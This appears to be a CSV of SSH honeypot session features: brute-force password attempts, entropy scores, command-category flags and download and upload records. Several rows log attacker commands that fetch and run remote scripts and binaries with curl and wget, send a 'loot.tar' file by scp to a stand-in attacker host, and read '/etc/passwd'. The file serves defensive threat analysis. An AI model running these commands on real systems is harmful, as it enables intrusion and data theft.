session,session_start,session_end,duration,src_ip,dst_ip,dst_port,protocol,user_first,sensor,uuid,login_success,login_fail,unique_users,unique_pass,cmd_count,unique_cmds,first_cmd,last_cmd,cmd_failed_count,unique_failed_cmds,first_failed_cmd,last_failed_cmd,reported_session_duration,reported_tty_duration,ttylog,ttylog_size,ttylog_duplicate,ttylog_shasum,file_download_count,first_download_url,first_download_outfile,file_upload_count,first_upload_filename,first_upload_outfile,first_upload_destfile,first_upload_url,pw_entropy_per_char,pw_entropy_total,pw_normalized_entropy,pw_length_mean,pw_unique_chars_mean,pw_total_strength,passwords_used,cmds_per_min,fails_per_min,cmd_failed_per_min,cmd_failed_ratio,has_successful_login,has_any_commands,has_failed_commands,is_local_src,contains_recon_cmds,contains_install_cmds,contains_nav_cmds,contains_exit_cmd,contains_persist_terms,contains_exec_terms,contains_kill_terms,contains_network_terms,commands_used,failed_cmds_used
19ddfa08ac44,2026-03-04 13:05:01+00:00,2026-03-04 13:05:04.500000+00:00,3.5,91.92.109.12,10.0.0.5,2222.0,ssh,root,PC4Me,bb88cc30-1649-11f1-8bf4-00155d923fee,0,3,3,3,0,0,,,0,0,,,3.5,,,,,,0,,,0,,,,,2.2421888895299165,15.094737505048093,0.9624510068154951,6.333333333333333,5.333333333333333,23.59473750504809,"['toor', 'oracle', 'raspberry']",0.0,51.42857054693879,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,[],[]
2f8ab194d0e8,2026-03-04 14:28:00+00:00,2026-03-04 14:28:03+00:00,3.0,198.18.0.77,10.0.0.5,2222.0,ssh,test,PC4Me,ab33bc80-1649-11f1-8bf4-00155d923fee,0,2,2,2,0,0,,,0,0,,,3.0,,,,,,0,,,0,,,,,2.160964047443681,9.804820237218404,1.0,4.5,4.5,16.554820237218404,"['1234', 'admin']",0.0,39.99999920000001,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,[],[]
5e7f9d0aa131,2026-03-04 14:40:30+00:00,2026-03-04 14:40:37.900000+00:00,7.9,66.240.219.146,10.0.0.5,2222.0,ssh,backup,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,1,0,1,1,4,4,ls -la,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,1,1,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,7.8,7.4,var/lib/cowrie/tty/5e7f9d0aa131.log,876.0,False,c81e728d9d4c2f636f067f89cc14862c,0,,,1,loot.tar,var/lib/cowrie/uploads/5e7f9d0aa131_loot.tar,,,2.584962500721156,15.509775004326936,1.0,6.0,6.0,24.509775004326936,['backup'],30.379746604710782,0.0,7.5949366511776955,0.2499999999375,1,1,1,0,1,1,1,0,0,0,0,0,"['ls -la', 'cat /proc/cpuinfo', 'touch scan.txt', 'scp loot.tar attacker@198.51.100.77:/tmp/loot.tar']",['scp loot.tar attacker@198.51.100.77:/tmp/loot.tar']
77ca82f0e1ab,2026-03-04 12:40:10+00:00,2026-03-04 12:40:18.500000+00:00,8.5,45.83.64.12,10.0.0.5,2222.0,ssh,admin,PC4Me,aa77bb20-1649-11f1-8bf4-00155d923fee,1,0,1,1,4,4,pwd,./dropper.sh,1,1,./dropper.sh,./dropper.sh,8.5,8.3,var/lib/cowrie/tty/77ca82f0e1ab.log,981.0,False,16b98cfb4a6c0b77f4f2f907f16a22b4cbd1a111,0,,,0,,,,,2.75,22.0,0.979569764547061,8.0,7.0,33.0,['password'],28.235293918339103,0.0,7.058823479584776,0.2499999999375,1,1,1,0,1,1,0,0,0,1,0,0,"['pwd', 'curl http://example.com/dropper.sh', 'chmod +x dropper.sh', './dropper.sh']",['./dropper.sh']
7c99d0af04c1,2026-03-04 14:12:10+00:00,2026-03-04 14:12:21.200000+00:00,11.2,172.104.18.91,10.0.0.5,2222.0,ssh,operator,PC4Me,ff22aa70-1649-11f1-8bf4-00155d923fee,1,0,1,1,6,6,pwd,./arm7,1,1,./arm7,./arm7,11.2,10.9,var/lib/cowrie/tty/7c99d0af04c1.log,1102.0,False,c4ca4238a0b923820dcc509a6f75849b,1,http://203.0.113.200/tools/arm7,var/lib/cowrie/downloads/1f3870be274f6c49b3e31a0c6728957f,1,loot.txt,var/lib/cowrie/uploads/7c99d0af04c1_loot.txt,,,2.5,20.0,0.967132018086354,8.0,6.0,30.0,['operator'],32.14285697066327,0.0,5.3571428284438785,0.16666666663888888,1,1,1,0,1,1,1,0,0,0,0,0,"['pwd', 'uname -a', 'id', 'wget http://203.0.113.200/tools/arm7', 'chmod +x arm7', './arm7']",['./arm7']
884fca7720be,2026-03-04 14:55:50+00:00,2026-03-04 14:55:58.100000+00:00,8.1,89.248.172.16,10.0.0.5,2222.0,ssh,mysql,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,1,2,3,3,4,4,whoami,exit,1,1,sh loader.sh,sh loader.sh,8.0,7.1,var/lib/cowrie/tty/884fca7720be.log,744.0,False,d3d9446802a44259755d38e6d163e820,1,http://198.51.100.88/loader.sh,var/lib/cowrie/downloads/45c48cce2e2d7fbdea1afc51c7c6ad26,0,,,,,2.218963531869506,12.788175992200093,0.993189921515687,5.333333333333333,5.0,20.45484265886676,"['mysql', 'postgres', 'dev']",29.629629410150898,14.814814705075449,7.407407352537724,0.2499999999375,1,1,1,0,1,1,0,1,0,1,0,0,"['whoami', 'curl http://198.51.100.88/loader.sh', 'sh loader.sh', 'exit']",['sh loader.sh']
bf1d67850980,2026-03-04 11:37:40.100000+00:00,2026-03-04 11:38:12.160101+00:00,32.060101,127.0.0.1,127.0.0.1,2222.0,ssh,root,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,1,2,3,3,10,10,mkdir dontfind,exit,2,2,pip install python,--help ,32.6,29.2,var/lib/cowrie/tty/b91241e46754406f389d77638b711e3af003fcc9038febb077b0c2cb532cdd0f,724.0,False,b91241e46754406f389d77638b711e3af003fcc9038febb077b0c2cb532cdd0f,0,,,0,,,,,2.2739760316291204,13.869880158145603,0.9821315434523954,5.666666666666667,5.333333333333333,22.036546824812273,"['root', 'admin123', 'guest']",18.714850551378767,3.742970110275753,3.742970110275753,0.19999999998,1,1,1,1,1,1,1,1,0,1,0,0,"['mkdir dontfind', 'ls', 'cd dontfind', 'pip install python', 'uname -a', 'whoami', 'wget http://malicious.example/payload.sh', '--help ', 'cat /etc/passwd', 'exit']","['pip install python', '--help ']"
c1a2bb7fd932,2026-03-04 13:21:10+00:00,2026-03-04 13:21:18.100000+00:00,8.1,203.0.113.77,10.0.0.5,2222.0,ssh,service,PC4Me,cc99dd40-1649-11f1-8bf4-00155d923fee,1,0,1,1,3,3,id,wget http://198.51.100.10/bins/mips,0,0,,,8.0,7.8,var/lib/cowrie/tty/c1a2bb7fd932.log,654.0,False,9d5ed678fe57bcca610140957afab571,1,http://198.51.100.10/bins/mips,var/lib/cowrie/downloads/8f14e45fceea167a5a36dedd4bea2543,0,,,,,2.5216406363433186,17.65148445440323,0.9755037590061086,7.0,6.0,27.15148445440323,['service'],22.222222057613173,0.0,0.0,0.0,1,1,0,0,1,1,0,0,0,0,0,0,"['id', 'uname -r', 'wget http://198.51.100.10/bins/mips']",[]
de9a441bb210,2026-03-04 12:10:01+00:00,2026-03-04 12:10:06.200000+00:00,5.2,185.220.101.45,10.0.0.5,2222.0,ssh,root,PC4Me,9888aa10-1649-11f1-8bf4-00155d923fee,0,3,3,3,0,0,,,0,0,,,5.2,,,,,,0,,,0,,,,,1.9591479170272448,10.754887502163468,0.9475450851791584,5.333333333333333,4.333333333333333,17.754887502163466,"['123456', 'ubuntu', 'test']",0.0,34.615384215976334,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,[],[]
e55f0a4bb761,2026-03-04 13:44:00+00:00,2026-03-04 13:44:01.600000+00:00,1.6,198.51.100.24,10.0.0.5,2222.0,ssh,support,PC4Me,dd10ee50-1649-11f1-8bf4-00155d923fee,0,1,1,1,0,0,,,0,0,,,1.6,,,,,,0,,,0,,,,,2.5216406363433186,17.65148445440323,0.9755037590061086,7.0,6.0,27.15148445440323,['support'],0.0,37.49999859375005,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,[],[]
